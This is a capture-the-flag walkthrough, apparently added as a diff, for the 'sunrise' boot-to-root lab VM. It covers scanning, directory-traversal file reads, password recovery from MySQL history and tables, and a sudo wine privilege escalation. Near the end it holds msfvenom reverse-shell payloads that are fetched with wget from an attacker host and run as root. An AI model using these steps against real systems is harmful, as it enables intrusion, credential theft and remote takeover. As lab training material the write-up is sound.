@@ -1,0 +1,263 @@
+[*]
+1. Find host: nmap -sn 172.16.16.0/24
+MAC Address: 08:00:27:69:B5:42 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.28
+Host is up (0.00031s latency).
+MAC Address: 08:00:27:99:60:DF (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.4
+Host is up.
+[*]
+2. quick scan: nmap -sS 172.16.16.28
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3306/tcp open  mysql
+8080/tcp open  http-proxy
+[*]
+3. Check for SSH banner
+The authenticity of host '172.16.16.28 (172.16.16.28)' can't be established.
+ECDSA key fingerprint is SHA256:4yaOo7mwlBs//3V1VVqqtiApksgelyI4AJwhIUfz0UQ.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '172.16.16.28' (ECDSA) to the list of known hosts.
+root@172.16.16.28's password: 
+[*]
+4. Check HTTP: no interesting things at /
+nikto -h
++ Server: nginx/1.14.2
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ 7889 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2019-12-14 14:40:47 (GMT-6) (19 seconds)
+---------------------------------------------------------------------------
+dirb http://172.16.16.28/ -a linux
+**no results**
+[*]
+5. Check alt web port:
+nikto -h 172.16.16.28 -p 8080
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          172.16.16.28
++ Target Hostname:    172.16.16.28
++ Target Port:        8080
++ Start Time:         2019-12-14 14:43:18 (GMT-6)
+---------------------------------------------------------------------------
++ Server: Weborf (GNU/Linux)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Retrieved dav header: ARRAY(0x56331c4f9530)
++ Retrieved ms-author-via header: DAV
++ Uncommon header 'ms-author-via' found, with contents: DAV
++ Allowed HTTP Methods: GET, POST, PUT, DELETE, OPTIONS, PROPFIND, MKCOL, COPY, MOVE 
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
++ WebDAV enabled (COPY MKCOL PROPFIND listed as allowed)
++ /%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd: The Web_Server_4D is vulnerable to a directory traversal problem.
++ /../../../../winnt/repair/sam._: Sam backup successfully retrieved.
++ /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd: Web server allows reading of files by sending encoded '../' requests. This server may be Boa (boa.org).
++ OSVDB-3092: /html/: This might be interesting...
+
+
+**FOUND PUT OPTION**
+**FOUND LFI
+[*]
+6. re-check PUT option:
+python script
+from urllib import PoolManager; http = PoolManager()
+r = http.request("PUT", "http://172.16.16.28:8080/", "test")
+r.data.decode()
+#Got un-authorized message
+[*]
+7. LFI enumeration
+http://172.16.16.28:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2f
+shows folders sunrise and weborf
+http://172.16.16.28:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2f
+shows user.txt
+a6050aecf6303b0b824038807d823a89
+[*]
+8. Identify hash
+hash-identifier
+a6050aecf6303b0b824038807d823a89
+MD5
+[*]
+9. Enumerate LFI
+base=(sunrise weborf); for i in ${base[@]}
+do
+dirb "http://172.16.16.28:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2f$i"%2f | grep 200
+done
++ http://172.16.16.28:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2f/.bashrc (CODE:200|SIZE:3526)
++ http://172.16.16.28:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2f/.profile (CODE:200|SIZE:807)
++ http://172.16.16.28:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2f/Documents (CODE:301SIZE:0)                                                           
++ http://172.16.16.28:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.bashrc (CODE:200|SIZE:3526)
++ http://172.16.16.28:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.mysql_history (CODE:200|SIZE:83)
++ http://172.16.16.28:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.profile (CODE:200|SIZE:807)
+[*]
+10. Examine files
+**.mysql_history
+show databases;
+ALTER USER 'weborf'@'localhost' IDENTIFIED BY 'iheartrainbows44';
+[*]
+11. Found SSH login
+weborf@172.16.16.28
+iheartrainbows44
+[*]
+12. User enumeration
+-rw-r--r-- 1 weborf weborf  220 Dec  5 15:05 .bash_logout
+-rw-r--r-- 1 weborf weborf 3526 Dec  5 15:05 .bashrc
+drwx------ 3 weborf weborf 4096 Dec  5 15:41 .gnupg
+drwxr-xr-x 3 weborf weborf 4096 Dec  5 15:09 .local
+-rw------- 1 weborf weborf   83 Dec  5 16:43 .mysql_history
+-rw-r--r-- 1 weborf weborf  807 Dec  5 15:05 .profile
+-rw-r--r-- 1 weborf weborf   66 Dec  5 15:09 .selected_editor
+drwxr-xr-x 5 weborf weborf 4096 Dec  5 15:07 weborf-0.12.2
+-rw-r--r-- 1 weborf weborf  173 Dec  5 15:07 .wget-hsts
+[*]
+13. mysql -u weborf -p iheartrainbows44
+SHOW DATABASES;
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+
+use mysql;
+show tables;
+| column_stats              |
+| columns_priv              |
+| db                        |
+| event                     |
+| func                      |
+| general_log               |
+| gtid_slave_pos            |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| index_stats               |
+| innodb_index_stats        |
+| innodb_table_stats        |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| roles_mapping             |
+| servers                   |
+| slow_log                  |
+| table_stats               |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
+| transaction_registry      |
+| user                      |
+show columns from user;
+ Host                   | char(60)                          | NO   | PRI |          |       |
+| User                   | char(80)                          | NO   | PRI |          |       |
+| Password               | char(41)                          | NO   |     |          |       |
+| Select_priv            | enum('N','Y')                     | NO   |     | N        |       |
+| Insert_priv            | enum('N','Y')                     | NO   |     | N        |       |
+| Update_priv            | enum('N','Y')                     | NO   |     | N        |       |
+| Delete_priv            | enum('N','Y')                     | NO   |     | N        |       |
+| Create_priv            | enum('N','Y')                     | NO   |     | N        |       |
+| Drop_priv              | enum('N','Y')                     | NO   |     | N        |       |
+| Reload_priv            | enum('N','Y')                     | NO   |     | N        |       |
+| Shutdown_priv          | enum('N','Y')                     | NO   |     | N        |       |
+| Process_priv           | enum('N','Y')                     | NO   |     | N        |       |
+| File_priv              | enum('N','Y')                     | NO   |     | N        |       |
+| Grant_priv             | enum('N','Y')                     | NO   |     | N        |       |
+| References_priv        | enum('N','Y')                     | NO   |     | N        |       |
+| Index_priv             | enum('N','Y')                     | NO   |     | N        |       |
+| Alter_priv             | enum('N','Y')                     | NO   |     | N        |       |
+| Show_db_priv           | enum('N','Y')                     | NO   |     | N        |       |
+| Super_priv             | enum('N','Y')                     | NO   |     | N        |       |
+| Create_tmp_table_priv  | enum('N','Y')                     | NO   |     | N        |       |
+| Lock_tables_priv       | enum('N','Y')                     | NO   |     | N        |       |
+| Execute_priv           | enum('N','Y')                     | NO   |     | N        |       |
+| Repl_slave_priv        | enum('N','Y')                     | NO   |     | N        |       |
+| Repl_client_priv       | enum('N','Y')                     | NO   |     | N        |       |
+| Create_view_priv       | enum('N','Y')                     | NO   |     | N        |       |
+| Show_view_priv         | enum('N','Y')                     | NO   |     | N        |       |
+| Create_routine_priv    | enum('N','Y')                     | NO   |     | N        |       |
+| Alter_routine_priv     | enum('N','Y')                     | NO   |     | N        |       |
+| Create_user_priv       | enum('N','Y')                     | NO   |     | N        |       |
+| Event_priv             | enum('N','Y')                     | NO   |     | N        |       |
+| Trigger_priv           | enum('N','Y')                     | NO   |     | N        |       |
+| Create_tablespace_priv | enum('N','Y')                     | NO   |     | N        |       |
+| Delete_history_priv    | enum('N','Y')                     | NO   |     | N        |       |
+| ssl_type               | enum('','ANY','X509','SPECIFIED') | NO   |     |          |       |
+| ssl_cipher             | blob                              | NO   |     | NULL     |       |
+| x509_issuer            | blob                              | NO   |     | NULL     |       |
+| x509_subject           | blob                              | NO   |     | NULL     |       |
+| max_questions          | int(11) unsigned                  | NO   |     | 0        |       |
+| max_updates            | int(11) unsigned                  | NO   |     | 0        |       |
+| max_connections        | int(11) unsigned                  | NO   |     | 0        |       |
+| max_user_connections   | int(11)                           | NO   |     | 0        |       |
+| plugin                 | char(64)                          | NO   |     |          |       |
+| authentication_string  | text                              | NO   |     | NULL     |       |
+| password_expired       | enum('N','Y')                     | NO   |     | N        |       |
+| is_role                | enum('N','Y')                     | NO   |     | N        |       |
+| default_role           | char(80)                          | NO   |     |          |       |
+| max_statement_time     | decimal(12,6)                     | NO   |     | 0.000000 |       |
+
+select User,Password from user;
++---------+-------------------------------------------+
+| User    | Password                                  |
++---------+-------------------------------------------+
+| root    | *C7B6683EEB8FF8329D8390574FAA04DD04B87C58 |
+| sunrise | thefutureissobrightigottawearshades       |
+| weborf  | *A76018C6BB42E371FD7B71D2EC6447AE6E37DB28 |
+[*]
+14. login as sunrise
+su - sunrise
+thefutureissobrightigottawearshades
+[*]
+15. sudo -l
+(root) /usr/bin/wine
+This means we can run 32bit binaries as root
+[*]
+16. Generate, setup, and kickoff shell
+msfvenom -p windows/shell/reverse_tcp LHOST=172.16.16.4 LPORT=123 -f exe -o shell.exe
+python -m SimpleHTTPServer 80
+nc -nvlp 123
+**on victim**
+wget -O shell.exe http://172.16.16.4/shell.exe
+sudo wine shell.exe
+[*]
+17. Shell keeps dying, try again with different type
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.16.4 LPORT=123 -f exe -o shell.exe
+python -m SimpleHTTPServer 80
+msfconsole
+use exploit/multi/handler
+set LHOST 172.16.16.4
+set LPORT 123
+exploit
+**on victim**
+wget -O shell.exe http://172.16.16.4/shell.exe
+sudo wine shell.exe
+[*]
+18. Upgrade wine shell to root!
+**in meterpreter** execute -f /usr/bin/bash
+**go back to victim**
+root@sunrise:~# cat root.txt 
+            ^^                   @@@@@@@@@
+       ^^       ^^            @@@@@@@@@@@@@@@
+                            @@@@@@@@@@@@@@@@@@              ^^
+                           @@@@@@@@@@@@@@@@@@@@
+ ~~~~ ~~ ~~~~~ ~~~~~~~~ ~~ &&&&&&&&&&&&&&&&&&&& ~~~~~~~ ~~~~~~~~~~~ ~~~
+ ~         ~~   ~  ~       ~~~~~~~~~~~~~~~~~~~~ ~       ~~     ~~ ~
+   ~      ~~      ~~ ~~ ~~  ~~~~~~~~~~~~~ ~~~~  ~     ~~~    ~ ~~~  ~ ~~
+   ~  ~~     ~         ~      ~~~~~~  ~~ ~~~       ~~ ~ ~~  ~~ ~
+ ~  ~       ~ ~      ~           ~~ ~~~~~~  ~      ~~  ~             ~~
+       ~             ~        ~      ~      ~~   ~             ~
+
+Thanks for playing! - Felipe Winsnes (@whitecr0wz)
+
+24edb59d21c273c033aa6f1689b0b18c
+[*]
+
+
